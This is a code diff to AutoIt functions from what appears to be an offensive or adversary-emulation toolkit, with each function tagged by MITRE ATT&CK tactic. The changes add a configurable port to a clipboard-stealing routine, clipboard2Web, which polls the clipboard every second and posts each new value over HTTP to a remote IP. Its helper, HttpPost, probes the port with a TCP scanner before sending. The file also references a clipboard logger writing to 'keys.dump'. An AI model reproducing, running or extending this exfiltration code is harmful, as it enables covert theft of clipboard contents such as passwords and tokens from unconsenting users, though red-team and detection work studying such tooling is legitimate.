@@ -78,7 +78,7 @@ Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump");DESCRIPTIO
    WEnd
 EndFunc
 
-Func clipboard2Web($ip, $tag, $timeOut = 10);DESCRIPTION:Log to file the data stored in the clipboard;MITRE:Collection
+Func clipboard2Web($ip, $tag, $port = "80", $timeOut = 10);DESCRIPTION:Log to file the data stored in the clipboard;MITRE:Collection
    $buffer=""
    While 1
 	  if $timeOut > 0 Then
@@ -86,7 +86,7 @@ Func clipboard2Web($ip, $tag, $timeOut = 10);DESCRIPTION:Log to file the data st
 		 Sleep(1000)
 		 if $buffer <> $Data Then
 			$buffer = $Data
-			HttpPost($ip, $tag, $buffer)
+			HttpPost($ip, $tag, $port, $buffer)
 		 EndIf
 		 $timeOut=$timeOut-1
 	  Else
@@ -263,13 +263,13 @@ Func TCPscanner($ip,$port);DESCRIPTION:TCP scanner;MITRE:Discovery
    EndIf
 EndFunc
 
-Func HttpPost($ip, $tag, $sData = "");DESCRIPTION:Send data over Http;MITRE:Command and Control
-   if TCPscanner($ip, "80") == "open" Then
+Func HttpPost($ip, $tag, $port = "80", $sData = "");DESCRIPTION:Send data over Http;MITRE:Command and Control
+	if TCPscanner($ip, $port) == "open" Then
 	  Local $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")
-	  $oHTTP.Open("POST", "http://" & $ip, False)
+	  $oHTTP.Open("POST", "http://" & $ip & ":" & $port, False)
 	  If (@error) Then Return 0
 	  $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
-	  $oHTTP.Send("#" & $tag & ": " & $sData)
+	  $oHTTP.Send($tag & "=" & $sData)
 	  If (@error) Then Return 0
 	  If ($oHTTP.Status <> 200) Then Return SetError(3, 0, 0)
 	  Return SetError(0, 0, $oHTTP.ResponseText)
